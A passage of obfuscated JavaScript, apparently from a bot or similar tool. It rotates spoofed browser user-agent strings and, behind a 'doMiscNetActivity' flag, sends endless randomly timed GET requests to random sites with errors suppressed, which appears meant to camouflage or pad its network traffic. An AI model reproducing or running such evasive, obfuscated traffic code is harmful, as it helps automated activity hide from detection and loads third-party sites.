      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xd18 * 0x1 + 0x1324 + -0x60c; k < -0x1c4e * -0x1 + -0xfb9 + -0xc91; k++)
    setTimeout(f, (-0x90d0 + -0x1775e * 0x1 + -0x17947 * -0x2) * k * getRandomInt(-0x3 * 0x9fd + 0x10dc + 0x4 * 0x347, 0x4d2 * 0x3 + 0x10f * -0x15 + 0x7c8));
  setInterval(() => {
    f();
    for (let l = 0x11a9 + -0xfc2 + -0x1e7 * 0x1; l < -0x23df + 0x1e41 + 0x5a2; l++)
      setTimeout(f, (-0x4f70 * 0x1 + 0x1475a * 0x1 + -0xd8a) * l * getRandomInt(0x36b + -0x59 * -0x29 + 0x11ab * -0x1, -0x85c + 0x30 * -0xaa + 0x283f));
  }, 0x40d4b8 + 0x64a04a * 0x1 + 0x146 * -0x56cb);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x71e + 0x29b * 0x1 + -0x7 * -0x48d) * getRandomInt(0x1 * 0x2443 + 0xa68 + -0x21f * 0x16, -0xb3 * -0xd + 0x180a + -0x146 * 0x1a));
}, 0x23 * -0x57 + -0x1 * 0x20c + -0x3 * -0x4c7);